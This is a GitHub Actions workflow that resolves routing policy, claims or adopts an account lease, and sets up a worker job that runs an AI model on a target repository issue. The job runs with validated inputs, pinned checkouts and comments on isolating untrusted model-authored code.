# [GPT-5.6] Registry worker. Dry-run remains the default; REG-3's live path claims a CAS
# lease, revalidates trust, runs one routed model attempt, seals that work PRE-GATE as a
# digest-bound bundle, gates it host-side, and a SEPARATE clean-runner `publish` job (no target
# code) reconstructs the bundle and opens the DRAFT target PR (cross-provider review pending).
# Publish never arms: the pipeline records the implementer's identity in the registry
# (orchestration/provenance/) and stops; the lease releases immediately, and the dispatch sweep
# drives the review-fix loop that alone may arm the PR.
name: worker
# The target_repo is embedded in the run-name so the throughput-metrics collector (scripts/
# metrics.py) can attribute a registry-hosted worker run to its TARGET — sparq's worker/review
# orchestration runs here in the registry, not in a sparq-hosted workflow, so per-target health
# must be filtered off these run names. Mirrors review-fix.yml's run-name convention.
run-name: worker ${{ inputs.target_repo }} claim=${{ inputs.claim_id || 'self' }}

on:
  workflow_dispatch:
    inputs:
      target_repo:
        description: Target owner/repository allowed by policy/repos.toml
        required: true
        type: string
      issue_number:
        description: Existing target issue used to resolve routing labels and task content
        required: true
        type: string
      account:
        description: Dry-run account handle; ignored by live runs, which claim from policy
        required: true
        type: string
      claim_id:
        description: Optional dispatcher-owned CAS claim to adopt for a live run
        required: false
        default: ''
        type: string
      dry_run:
        description: Prove policy, target token, checkout, and credential prep without live effects
        required: true
        default: true
        type: boolean

permissions: {}

jobs:
  resolve:
    name: Resolve policy without worker secrets
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
      issues: read
    outputs:
      target_owner: ${{ steps.inputs.outputs.target_owner }}
      target_name: ${{ steps.inputs.outputs.target_name }}
      target_sha: ${{ steps.target_rev.outputs.target_sha }}
      issue_author: ${{ steps.issue.outputs.issue_author }}
      issue_body_sha: ${{ steps.issue.outputs.issue_body_sha }}
      packages: ${{ steps.issue.outputs.packages }}
      role: ${{ steps.issue.outputs.role }}
      routing: ${{ steps.policy.outputs.routing }}
      model_chain: ${{ steps.policy.outputs.model_chain }}
      account_pool: ${{ steps.policy.outputs.account_pool }}
      agent: ${{ steps.policy.outputs.agent }}
      gate_profile: ${{ steps.policy.outputs.gate_profile }}
      arm_auto_merge: ${{ steps.policy.outputs.arm_auto_merge }}
      max_attempts: ${{ steps.policy.outputs.max_attempts }}
      max_concurrent: ${{ steps.policy.outputs.max_concurrent }}
      worker_timeout_minutes: ${{ steps.policy.outputs.worker_timeout_minutes }}
      provider: ${{ steps.account.outputs.provider }}
      harness: ${{ steps.account.outputs.harness }}
      model: ${{ steps.account.outputs.model }}
      provider_model: ${{ steps.account.outputs.provider_model }}
      credential_format: ${{ steps.account.outputs.credential_format }}
      secret_ref: ${{ steps.account.outputs.secret_ref }}
    steps:
      - name: Validate dispatch inputs
        id: inputs
        env:
          TARGET_REPO: ${{ inputs.target_repo }}
          ISSUE_NUMBER: ${{ inputs.issue_number }}
          ACCOUNT: ${{ inputs.account }}
          CLAIM_ID: ${{ inputs.claim_id }}
          DRY_RUN: ${{ inputs.dry_run }}
        run: |
          python3 - <<'PY'
          import os
          import re

          target = os.environ["TARGET_REPO"]
          issue = os.environ["ISSUE_NUMBER"]
          account = os.environ["ACCOUNT"]
          claim_id = os.environ["CLAIM_ID"]
          dry_run = os.environ["DRY_RUN"] == "true"
          if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*/[A-Za-z0-9][A-Za-z0-9_.-]*", target):
              raise SystemExit("target_repo must be a safe owner/repository name")
          if not re.fullmatch(r"[1-9][0-9]*", issue):
              raise SystemExit("issue_number must be a positive integer")
          if not re.fullmatch(r"acct[0-9a-z]{2,}", account):
              raise SystemExit("account must be an acctNN registry handle")
          if claim_id and not re.fullmatch(r"[0-9a-f]{32}", claim_id):
              raise SystemExit("claim_id must be empty or a lowercase 32-hex CAS identifier")
          if claim_id and dry_run:
              raise SystemExit("a dispatcher claim cannot be used by a dry run")
          owner, name = target.split("/", 1)
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              output.write(f"target_owner={owner}\n")
              output.write(f"target_name={name}\n")
          PY

      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      - name: Checkout public target for protected routing data (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          repository: ${{ inputs.target_repo }}
          path: target-routing
          persist-credentials: false

      # Bind the whole decision to ONE target revision (issue #143): routing/model_chain/agent are
      # resolved from THIS checkout's HEAD, but the worker job later checks out the moving default
      # branch and only re-checks that the claimed model still exists — so a routing update landing
      # between the two jobs could run a stale/out-of-policy model+prompt. Export the exact commit
      # SHA the route was resolved against and pin the worker's target checkout to it, so the model
      # runs on, and re-reads its routing metadata from, the identical revision policy saw here.
      - name: Pin the resolved target routing revision
        id: target_rev
        run: |
          set -euo pipefail
          sha="$(git -C target-routing rev-parse HEAD)"
          [[ "$sha" =~ ^[0-9a-f]{40}$ ]] || { echo '::error::resolved target revision is not a 40-hex commit sha'; exit 1; }
          printf 'target_sha=%s\n' "$sha" >> "$GITHUB_OUTPUT"
          printf 'worker: routing resolved against target revision %s\n' "$sha"

      - name: Snapshot issue labels and revision
        id: issue
        env:
          GH_TOKEN: ${{ github.token }}
          TARGET_REPO: ${{ inputs.target_repo }}
          ISSUE_NUMBER: ${{ inputs.issue_number }}
        run: |
          set -euo pipefail
          gh api "repos/$TARGET_REPO/issues/$ISSUE_NUMBER" > "$RUNNER_TEMP/issue.json"
          python3 - "$RUNNER_TEMP/issue.json" "$RUNNER_TEMP/labels" <<'PY'
          import hashlib
          import json
          import os
          import re
          import sys

          issue_path, labels_path = sys.argv[1:]
          with open(issue_path, encoding="utf-8") as handle:
              issue = json.load(handle)
          if "pull_request" in issue:
              raise SystemExit("issue_number identifies a pull request, not an issue")
          if issue.get("state") != "open":
              raise SystemExit("target issue must be open")
          labels = sorted({
              label.get("name")
              for label in issue.get("labels", [])
              if isinstance(label, dict) and isinstance(label.get("name"), str) and label.get("name")
          })
          roles = sorted(label[5:] for label in labels if label.startswith("role:"))
          packages = sorted(label[5:] for label in labels if label.startswith("area:"))
          if len(roles) != 1 or not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*", roles[0]):
              raise SystemExit("target issue must carry exactly one safe role:* label")
          if any(not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*", package) for package in packages):
              raise SystemExit("target issue has an unsafe area:* label")
          author = issue.get("user", {}).get("login")
          if (not isinstance(author, str)
                  or not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*(?:\[bot\])?", author)):
              raise SystemExit("target issue has an unsafe or missing author")
          with open(labels_path, "w", encoding="utf-8") as handle:
              for label in labels:
                  handle.write(f"{label}\n")
          values = {
              "issue_author": author,
              "issue_body_sha": hashlib.sha256((issue.get("body") or "").encode()).hexdigest(),
              "packages": ",".join(packages),
              "role": roles[0],
          }
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              for key, value in values.items():
                  output.write(f"{key}={value}\n")
          PY

      - name: Resolve issue routing through registry policy
        id: policy
        env:
          TARGET_REPO: ${{ inputs.target_repo }}
        run: |
          set -euo pipefail
          args=(
            --target-repo "$TARGET_REPO"
            --policy-file registry/policy/repos.toml
            --target-root target-routing
          )
          while IFS= read -r label; do
            args+=(--label "$label")
          done < "$RUNNER_TEMP/labels"
          python3 registry/scripts/policy-resolve.py "${args[@]}" > "$RUNNER_TEMP/policy.json"
          python3 - "$RUNNER_TEMP/policy.json" <<'PY'
          import json
          import os
          import re
          import sys

          with open(sys.argv[1], encoding="utf-8") as handle:
              policy = json.load(handle)
          csv_fields = {"model_chain": policy["model_chain"], "account_pool": policy["account_pool"]}
          for key, values in csv_fields.items():
              if not values or any(not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*", value) for value in values):
                  raise SystemExit(f"resolved {key} contains an unsafe value")
          values = {
              "routing": policy["routing"],
              "model_chain": ",".join(policy["model_chain"]),
              "account_pool": ",".join(policy["account_pool"]),
              "agent": policy["agent"],
              "gate_profile": policy["gate_profile"],
              "arm_auto_merge": str(policy["arm_auto_merge"]).lower(),
              "max_attempts": str(policy["max_attempts"]),
              "max_concurrent": str(policy["max_concurrent"]),
              "worker_timeout_minutes": str(policy["worker_timeout_minutes"]),
          }
          for key, value in values.items():
              if not isinstance(value, str) or not value or "\n" in value or "\r" in value:
                  raise SystemExit(f"unsafe or missing resolved value: {key}")
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              for key, value in values.items():
                  output.write(f"{key}={value}\n")
          print(
              f"policy resolved: models={','.join(policy['model_chain'])}, "
              f"gate={policy['gate_profile']}, max_attempts={policy['max_attempts']}"
          )
          PY

      - name: Validate dry-run account against resolved policy
        id: account
        if: ${{ inputs.dry_run }}
        env:
          GH_TOKEN: ${{ github.token }}
          ACCOUNT: ${{ inputs.account }}
        run: |
          set -euo pipefail
          gh issue list -R "$GITHUB_REPOSITORY" --state open --limit 500 \
            --json title,body,labels > "$RUNNER_TEMP/accounts.json"
          python3 - \
            "$GITHUB_WORKSPACE/registry/scripts/select-and-claim.py" \
            "$RUNNER_TEMP/policy.json" \
            "$RUNNER_TEMP/accounts.json" <<'PY'
          import importlib.util
          import json
          import os
          from pathlib import Path
          import re
          import sys
          import tomllib

          allocator_path, policy_path, accounts_path = sys.argv[1:]
          with open(policy_path, encoding="utf-8") as handle:
              policy = json.load(handle)
          target_root = Path(os.environ["GITHUB_WORKSPACE"], "target-routing").resolve()
          routing_path = Path(target_root, policy["routing"]).resolve()
          try:
              routing_path.relative_to(target_root)
          except ValueError as exc:
              raise SystemExit("resolved routing path escaped the target checkout") from exc
          with open(routing_path, "rb") as handle:
              routing = tomllib.load(handle)
          with open(accounts_path, encoding="utf-8") as handle:
              catalog = json.load(handle)

          spec = importlib.util.spec_from_file_location("select_and_claim", allocator_path)
          if spec is None or spec.loader is None:
              raise SystemExit("cannot load registry account parser")
          allocator = importlib.util.module_from_spec(spec)
          spec.loader.exec_module(allocator)
          account_name = os.environ["ACCOUNT"]
          # Use the allocator's ONE structural selector here as well. Live self-claim and
          # dispatcher-claim adoption already enter through read_accounts(); keeping dry-run on
          # this exact function prevents a broad issue listing from becoming a divergent pool.
          matches = [item for item in allocator.select_account_issues(catalog)
                     if item.get("title", "").strip() == account_name]
          # Privacy (issue #135): these run in PUBLIC logs, so every failure message stays
          # identifier-free — the raw account handle is never interpolated into the diagnostic.
          if len(matches) != 1:
              raise SystemExit("selected account is missing or ambiguous in the catalog")
          item = matches[0]
          labels = {label.get("name") for label in item.get("labels", []) if isinstance(label, dict)}
          if "status:available" not in labels:
              raise SystemExit("selected account is not marked status:available")
          if account_name not in policy["account_pool"]:
              raise SystemExit("selected account is outside the resolved account pool")

          # Round 5: route the parsed record through the SAME read-time legacy-shape
          # normalization read_accounts applies (sol r3 f1). A raw _parse_account() here gates
          # model membership LITERALLY, so a legacy `models: [terra]` record would fail this
          # sol-led dry-run even though the live claim path normalizes it. (Privacy: the parsed
          # record carries no handle and this step exports no PROVENANCE_SALT, so the shared
          # diagnostic stays handle-free in these public logs.)
          try:
              account = allocator.validate_account_record(account_name, item.get("body"))
          except allocator.LeaseIOError as exc:
              raise SystemExit("selected account record is malformed") from exc
          account = allocator.normalize_legacy_models(account)
          model = next((candidate for candidate in policy["model_chain"]
                        if candidate in account.get("models", [])), None)
          if model is None:
              raise SystemExit("selected account cannot serve the resolved model chain")
          model_meta = routing.get("models", {}).get(model)
          if not isinstance(model_meta, dict):
              raise SystemExit(f"selected model {model} has no routing metadata")
          provider = model_meta.get("provider")
          harness = model_meta.get("harness")
          credential_format = model_meta.get("credential_format")
          provider_model = model_meta.get("provider_model")
          if (provider, harness) not in {("openai", "codex"), ("anthropic", "claude")}:
              raise SystemExit("resolved model has an unsupported provider/harness pair")
          if account.get("provider") != provider:
              raise SystemExit("selected account provider does not match the resolved model")
          if account.get("harness") and account["harness"] != harness:
              raise SystemExit("selected account harness does not match the resolved model")
          if credential_format not in {
              "codex-auth-json", "claude-credentials-json", "claude-oauth-token", "anthropic-api-key"
          }:
              raise SystemExit("resolved model has an unsupported credential format")
          # Harness-aware contract (2026-07-18): "TBD" is the WIRE sentinel for an
          # unpinned codex model — it must survive GITHUB_OUTPUT's non-empty value check
          # (the later resolvers already normalize unset/empty -> "TBD" for exactly that
          # reason), and worker-live.sh omits --model for it so the codex CLI default
          # tracks the account's supported model. The incident: worker-live previously
          # omitted only on EMPTY, so the sentinel reached `codex exec --model TBD` ->
          # API 400 / degraded no-tool-call fallback on every terra fleet worker.
          # For claude, a concrete id remains mandatory.
          if provider_model in (None, "", "TBD"):
              if harness == "codex":
                  provider_model = "TBD"
              else:
                  raise SystemExit("resolved claude model has no concrete provider model")
          elif not isinstance(provider_model, str):
              raise SystemExit("resolved model provider_model is malformed")
          secret_ref = account.get("secret_ref")
          if secret_ref != f"{account_name.upper()}_TOKEN" or not re.fullmatch(r"[A-Z][A-Z0-9_]*", secret_ref):
              raise SystemExit("selected account has an unsafe or mismatched secret_ref")
          values = {
              "provider": provider,
              "harness": harness,
              "model": model,
              "provider_model": provider_model,
              "credential_format": credential_format,
              "secret_ref": secret_ref,
          }
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              for key, value in values.items():
                  if not isinstance(value, str) or not value or "\n" in value or "\r" in value:
                      raise SystemExit(f"unsafe or missing dry-run value: {key}")
                  output.write(f"{key}={value}\n")
          # Privacy (locked decision 22b): public workflow logs never carry account handles.
          print(f"dry-run account validated: model={model}, harness={harness}")
          PY

  claim:
    name: Claim live account lease
    if: ${{ !inputs.dry_run }}
    needs: resolve
    runs-on: ubuntu-latest
    timeout-minutes: 10
    environment: dispatch-secrets
    permissions:
      contents: write
      issues: read
    outputs:
      acquired: ${{ steps.adopt.outputs.acquired || steps.claim.outputs.acquired }}
      account: ${{ steps.adopt.outputs.account || steps.claim.outputs.account }}
      claim_id: ${{ steps.adopt.outputs.claim_id || steps.claim.outputs.claim_id }}
      model: ${{ steps.adopt.outputs.model || steps.claim.outputs.model }}
      provider: ${{ steps.adopt.outputs.provider || steps.claim.outputs.provider }}
      harness: ${{ steps.adopt.outputs.harness || steps.claim.outputs.harness }}
      credential_format: ${{ steps.adopt.outputs.credential_format || steps.claim.outputs.credential_format }}
      secret_ref: ${{ steps.adopt.outputs.secret_ref || steps.claim.outputs.secret_ref }}
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      - name: CAS claim from the policy-filtered account pool
        id: claim
        if: ${{ inputs.claim_id == '' }}
        env:
          GH_TOKEN: ${{ github.token }}
          TARGET_REPO: ${{ inputs.target_repo }}
          ISSUE_NUMBER: ${{ inputs.issue_number }}
          MODELS: ${{ needs.resolve.outputs.model_chain }}
          ACCOUNT_POOL: ${{ needs.resolve.outputs.account_pool }}
          PACKAGES: ${{ needs.resolve.outputs.packages }}
          ROLE: ${{ needs.resolve.outputs.role }}
          TIMEOUT_MINUTES: ${{ needs.resolve.outputs.worker_timeout_minutes }}
          PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
        run: |
          set -euo pipefail
          [[ "$TIMEOUT_MINUTES" =~ ^[1-9][0-9]*$ ]]
          ttl=$((TIMEOUT_MINUTES * 60 + 900))
          holder="$TARGET_REPO#$ISSUE_NUMBER@$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
          # THE canonical lease partition (issue #133 / #112), CALLED — never re-implemented here.
          # This used to be an open-coded bash `if [[ "$PACKAGES" != *,* ]]` reduction carrying only
          # a comment promising it "mirrors dispatch-plan._plan_package / dispatch-claim.
          # plan_package". It was semantically correct, but the 2026-07-26 review-lane loop proved
          # that a prose promise is not a test: the review-fix `resolve` job carried the same
          # promise, drifted to the pre-#112 rule, and its adopt step then rejected its own
          # dispatcher's claim on every tick forever. Reverting this line to that pre-#112 rule now
          # turns `dispatch-claim.py --self-test` RED (adopt-loop L4), because the pin is an
          # EXECUTED agreement against lease_schema.plan_package, not a grep.
          # This self-claim MUST reduce identically to the dispatcher-claim adoption path below and
          # to the dispatcher that mints an adoptable claim, or the SAME issue reserves a different
          # partition by entry path and a multi-area lease (e.g. "foo,bar") fails to conflict with a
          # concurrent single-area sibling ("foo"). Fail-closed: over-serialize a multi-area issue,
          # never free a busy crate — and `set -e` fails the step if the reduction cannot be
          # computed at all, so an unreadable registry checkout can never silently lease "".
          lease_package="$(python3 registry/scripts/lease_schema.py --plan-package "$PACKAGES")"
          [[ -n "$lease_package" ]] || { echo '::error::empty lease partition reduction'; exit 1; }
          set +e
          python3 registry/scripts/select-and-claim.py \
            --claim \
            --repo "$GITHUB_REPOSITORY" \
            --package "$lease_package" \
            --role "$ROLE" \
            --models "$MODELS" \
            --account-pool "$ACCOUNT_POOL" \
            --holder "$holder" \
            --holder-prefix "$TARGET_REPO#" \
            --max-holder-concurrent "${{ needs.resolve.outputs.max_concurrent }}" \
            --ttl "$ttl" > "$RUNNER_TEMP/claim.json"
          rc=$?
          set -e
          if [[ "$rc" -eq 3 ]]; then
            printf 'acquired=false\n' >> "$GITHUB_OUTPUT"
            printf 'No eligible account lease is free; deferring without failure.\n'
            exit 0
          fi
          [[ "$rc" -eq 0 ]] || { echo '::error::lease claim failed'; exit "$rc"; }
          python3 - "$RUNNER_TEMP/claim.json" "$ACCOUNT_POOL" "$MODELS" <<'PY'
          import json
          import os
          import re
          import sys

          claim_path, pool_csv, models_csv = sys.argv[1:]
          with open(claim_path, encoding="utf-8") as handle:
              claim = json.load(handle)
          pool = pool_csv.split(",")
          models = models_csv.split(",")
          account = claim.get("account")
          model = claim.get("model")
          claim_id = claim.get("claim_id")
          secret_ref = claim.get("secret_ref")
          if account not in pool or model not in models:
              raise SystemExit("allocator returned an account/model outside resolved policy")
          if not re.fullmatch(r"acct[0-9a-z]{2,}", str(account)):
              raise SystemExit("allocator returned an unsafe account")
          if secret_ref != f"{account.upper()}_TOKEN" or not re.fullmatch(r"[A-Z][A-Z0-9_]*", str(secret_ref)):
              raise SystemExit("allocator returned an unsafe or mismatched secret_ref")
          if not re.fullmatch(r"[0-9a-f]{32}", str(claim_id)):
              raise SystemExit("allocator returned an unsafe claim_id")
          # Fail-closed on a malformed catalog entry (issue #142): a claimed account MUST declare
          # every routing-relevant metadata field. An empty/missing provider, harness, or credential
          # format never rides through as "" — the strict routing equality below only fires on
          # NON-empty claimed values, so a blank field would let an account be routed on metadata it
          # never declared. Reject here so it never reaches the outputs or the secret.
          provider = claim.get("provider")
          harness = claim.get("harness")
          credential_format = claim.get("credential_format")
          for field_name, field_value in (
                  ("provider", provider),
                  ("harness", harness),
                  ("credential_format", credential_format)):
              if not isinstance(field_value, str) or not field_value:
                  raise SystemExit(f"allocator returned an empty or missing {field_name}")
          values = {
              "acquired": "true",
              "account": account,
              "claim_id": claim_id,
              "model": model,
              "provider": provider,
              "harness": harness,
              "credential_format": credential_format,
              "secret_ref": secret_ref,
          }
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              for key, value in values.items():
                  if "\n" in value or "\r" in value:
                      raise SystemExit(f"allocator returned unsafe {key}")
                  output.write(f"{key}={value}\n")
          # Privacy (locked decision 22b): public logs never carry account handles. (Historical
          # pre-migration runs printed the handle here — backfill-provenance.py parses only
          # those OLD logs; new runs record provenance at publish and never need it.)
          print(f"lease claimed: model={model}, claim={claim_id[:8]}")
          PY

      - name: Adopt dispatcher-owned CAS claim (ownership transfer)
        id: adopt
        if: ${{ inputs.claim_id != '' }}
        env:
          GH_TOKEN: ${{ github.token }}
          TARGET_REPO: ${{ inputs.target_repo }}
          ISSUE_NUMBER: ${{ inputs.issue_number }}
          EXPECTED_ACCOUNT: ${{ inputs.account }}
          CLAIM_ID: ${{ inputs.claim_id }}
          MODELS: ${{ needs.resolve.outputs.model_chain }}
          ACCOUNT_POOL: ${{ needs.resolve.outputs.account_pool }}
          PACKAGES: ${{ needs.resolve.outputs.packages }}
          ROLE: ${{ needs.resolve.outputs.role }}
          TIMEOUT_MINUTES: ${{ needs.resolve.outputs.worker_timeout_minutes }}
          PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
        run: |
          set -euo pipefail
          # Adoption is a CAS OWNERSHIP TRANSFER, not a read-only look (issue #132): --adopt swaps
          # the lease holder from the dispatcher to THIS worker run and re-bases its expiry to
          # now + the worker's full run budget, so (a) two runs can never both own one claim, (b) a
          # queued worker whose dispatcher lease already expired is refused (exit 3) instead of
          # resurrecting a reallocated slot, and (c) the lease cannot expire mid-run. The refreshed
          # ttl matches the claim job's self-claim ttl (worker_timeout + 15m slack).
          [[ "$TIMEOUT_MINUTES" =~ ^[1-9][0-9]*$ ]]
          ttl=$((TIMEOUT_MINUTES * 60 + 900))
          holder="$TARGET_REPO#$ISSUE_NUMBER@$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
          python3 registry/scripts/select-and-claim.py \
            --adopt "$CLAIM_ID" \
            --repo "$GITHUB_REPOSITORY" \
            --expected-holder-prefix "$TARGET_REPO#$ISSUE_NUMBER@" \
            --holder "$holder" \
            --ttl "$ttl" > "$RUNNER_TEMP/adopt.json"
          if ! python3 - "$RUNNER_TEMP/adopt.json" <<'PY'
          import json
          import os
          import re
          import sys

          with open(sys.argv[1], encoding="utf-8") as handle:
              claim = json.load(handle)
          account = claim.get("account")
          model = claim.get("model")
          claim_id = claim.get("claim_id")
          secret_ref = claim.get("secret_ref")
          pool = os.environ["ACCOUNT_POOL"].split(",")
          models = os.environ["MODELS"].split(",")
          # THE canonical lease partition (issue #133 / #112), IMPORTED from the registry checkout —
          # never re-implemented here. This step compares the dispatcher's minted `package` against
          # this re-derivation for EQUALITY, and the 2026-07-26 review-lane loop was exactly that
          # comparison failing forever because the two sides were separate copies of one reduction
          # held together by a comment. `lease_schema.plan_package` is the single canonical
          # definition; `dispatch-claim.plan_package` (the minter) delegates to it, so the two sides
          # of the equality below are the same code by construction. Deleting this import or
          # restoring the pre-#112 `areas[0]` rule turns `dispatch-claim.py --self-test` RED
          # (adopt-loop L5), because the pin EXECUTES this block against the canonical function.
          import importlib.util as _ilu
          _ls_spec = _ilu.spec_from_file_location(
              "registry_lease_schema", os.path.join("registry", "scripts", "lease_schema.py"))
          lease_schema = _ilu.module_from_spec(_ls_spec)
          _ls_spec.loader.exec_module(lease_schema)
          areas = [area for area in os.environ["PACKAGES"].split(",") if area]
          expected_package = lease_schema.plan_package(areas)
          if account != os.environ["EXPECTED_ACCOUNT"] or account not in pool:
              raise SystemExit("dispatcher claim account is outside resolved policy")
          if model not in models:
              raise SystemExit("dispatcher claim model is outside resolved routing")
          if claim_id != os.environ["CLAIM_ID"] or not re.fullmatch(r"[0-9a-f]{32}", str(claim_id)):
              raise SystemExit("dispatcher claim id is invalid")
          if claim.get("role") != os.environ["ROLE"] or claim.get("package") != expected_package:
              raise SystemExit("dispatcher claim work partition disagrees with resolved issue")
          if secret_ref != f"{account.upper()}_TOKEN" or not re.fullmatch(
                  r"[A-Z][A-Z0-9_]*", str(secret_ref)):
              raise SystemExit("dispatcher claim secret_ref is unsafe")
          # Fail-closed on a malformed catalog entry (issue #142): mirror the self-claim path — a
          # dispatcher-minted claim MUST declare every routing-relevant metadata field. An empty
          # provider/harness/credential format would be skipped by the routing equality check below
          # and route the account on undeclared metadata; reject before it reaches outputs/secret.
          provider = claim.get("provider")
          harness = claim.get("harness")
          credential_format = claim.get("credential_format")
          for field_name, field_value in (
                  ("provider", provider),
                  ("harness", harness),
                  ("credential_format", credential_format)):
              if not isinstance(field_value, str) or not field_value:
                  raise SystemExit(f"dispatcher claim returned an empty or missing {field_name}")
          values = {
              "acquired": "true",
              "account": account,
              "claim_id": claim_id,
              "model": model,
              "provider": provider,
              "harness": harness,
              "credential_format": credential_format,
              "secret_ref": secret_ref,
          }
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              for key, value in values.items():
                  if not isinstance(value, str) or "\n" in value or "\r" in value:
                      raise SystemExit(f"dispatcher claim returned unsafe {key}")
                  output.write(f"{key}={value}\n")
          # Privacy (locked decision 22b): public workflow logs never carry account handles.
          print(f"dispatcher lease adopted: model={model}, claim={claim_id[:8]}")
          PY
          then
            # Safe to release now: --adopt already CAS-transferred this lease to OUR run holder, so
            # this release deletes only our own lease — never a concurrent run's (issue #132: the
            # old --inspect path released a claim it did not own). A not-adoptable/already-adopted
            # claim never reaches here — --adopt exits 3 and `set -e` fails the step first.
            python3 registry/scripts/select-and-claim.py \
              --release "$CLAIM_ID" \
              --repo "$GITHUB_REPOSITORY" || true
            exit 1
          fi

  worker:
    name: ${{ inputs.dry_run && 'Prove dry-run worker environment' || 'Run live target worker (DRAFT, review pending)' }}
    if: ${{ always() && needs.resolve.result == 'success' && (inputs.dry_run || needs.claim.result == 'success') }}
    needs: [resolve, claim]
    runs-on: ubuntu-latest
    timeout-minutes: ${{ fromJSON(needs.resolve.outputs.worker_timeout_minutes) }}
    # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY + the per-account
    # secrets[secret_ref] credential, which live in the `dispatch-secrets` environment
    # (deployment-branch policy: default branch only) — full rationale on the `claim` job in
    # dispatch.yml.
    environment: dispatch-secrets
    permissions:
      # READ ONLY — this job executes model-authored target code HOST-side (the cargo gate), so
      # no registry-WRITE token may exist anywhere in its blast radius. The implementer
      # provenance record (the review loop's root of trust) is written by the separate
      # `provenance` job below, which executes no target code.
      contents: read
    outputs:
      # Target App identity + default branch, resolved by the `target` step at the TOP of this job
      # — before the checkout, before the model, and long before the gate. Like the bundle record
      # below, these are step outputs the runner captured while the runner was still clean, so the
      # isolated `publish` job can consume them without re-deriving; an empty value fails the
      # publisher's regex validation closed rather than defaulting to anything.
      bot_login: ${{ steps.target.outputs.bot_login }}
      bot_id: ${{ steps.target.outputs.bot_id }}
      default_branch: ${{ steps.target.outputs.default_branch }}
      # PRE-GATE publish record (issue #575). These three are step outputs of the `bundle` step,
      # which runs BEFORE the target's own gate: the runner captures them while the runner is still
      # clean, and nothing a later step does — including the hostile gate — can alter a step output
      # that has already been captured. The isolated `publish` job re-derives the digest from the
      # downloaded artifact and compares it against THESE values before it mints any token, so a
      # gate that rewrites the bundle, the registry checkout, or $GITHUB_ENV cannot get content
      # published. An empty bundle_digest (bundle step failed/skipped) means no publish at all.
      bundle_digest: ${{ steps.bundle.outputs.bundle_digest }}
      bundle_base_sha: ${{ steps.bundle.outputs.bundle_base_sha }}
      # PRE-MODEL trust-root digests (issue #568 + #575). `pin-trust-gate` records these BEFORE the
      # model runs and long before the gate, from the SHA-pinned checkouts — so like the bundle
      # record above they are step outputs captured while the runner was still clean, and no later
      # step (the model, the gate's build scripts) can alter them. The isolated `publish` job
      # re-derives the same three digests from ITS OWN fresh checkouts and refuses to re-verify —
      # hence refuses to publish — unless they match byte for byte. That is what makes the
      # publisher's trust root provably the reviewed, pre-hostile one rather than merely a
      # different checkout that is *probably* the same. Empty (a skipped/failed pin) fails closed:
      # the digest comparison in the publisher cannot succeed against an empty expectation.
      verifier_sha256: ${{ steps.pin-trust-gate.outputs.sha256 }}
      verifier_driver_sha256: ${{ steps.pin-trust-gate.outputs.driver_sha256 }}
      verifier_policy_sha256: ${{ steps.pin-trust-gate.outputs.policy_sha256 }}
      # The gate verdict crosses as a value, not as a token-bearing step: the publisher opens the
      # DRAFT PR only on `success`, and still creates follow-up issues on any other outcome (the
      # behaviour the old in-job `always()` followups step had).
      gate_outcome: ${{ steps.gate.outcome }}
      # Model-access health (registry #32): the sanitized exit CLASS of the model launch, surfaced
      # so the separate no-target-code `model_health` job records it (success or failure). The
      # provider/account/model come from the pre-hostile `claim` job outputs (not this job, which
      # runs target code), exactly like the provenance record.
      exit_class: ${{ steps.exit-class.outputs.class }}
      # The sanitized session-limit reset time worker-live.sh extracts (review defect #9); empty
      # for every other class. Feeds the provider-capped alert's "earliest known reset".
      reset_hint: ${{ steps.exit-class.outputs.reset_hint }}
      # THIS job's run attempt, stamped beside the class (review round 1 of #425): the recorder's
      # idempotency key must track the attempt that PRODUCED the outcome, not the recorder's own.
      # A recorder-only retry replays this preserved output (same attempt -> dedup no-op); a full
      # re-run re-executes this job and stamps a fresh attempt, so its genuinely new outcome
      # still counts toward backoff/outage thresholds.
      outcome_attempt: ${{ steps.exit-class.outputs.outcome_attempt }}
      # Final-state inputs (issue #127): surfaced so the SEPARATE always() `final_state` job can
      # converge the issue status even when THIS job is killed by its `worker_timeout_minutes`
      # timeout or a cancellation (which stops even an in-job always() step from running). On a
      # timeout/cancel the incomplete steps leave these empty, and the downstream job fails closed
      # to `deferred` — taking the issue OUT of status:in-progress and back into the redispatch pool.
      # (pr_url now comes from the isolated `publish` job — see issue #575.)
      # [issue #1075 review round 1] The REFUSAL result wins when there is one. `budget` runs
      # before `trust`, so on the terminal refusal it reports the PRE-charge state (used=N-1,
      # exhausted=false) and final_state fell through to `deferred` — its exhaustion arm could
      # not see the slot this very run had just spent, so the run that ended the budget was also
      # the one that left the issue in the retry frontier. `refusal` publishes the POST-charge
      # predicate; GitHub's `||` yields the first NON-EMPTY operand, so a skipped/never-reached
      # refusal step (the overwhelmingly common case) leaves the budget result exactly as it was,
      # and a refusal step that died before writing outputs falls back the same way.
      exhausted: ${{ steps.refusal.outputs.exhausted || steps.budget.outputs.exhausted }}
      trust_outcome: ${{ steps.trust.outcome }}
      attempt_number: ${{ steps.attempt.outputs.number }}
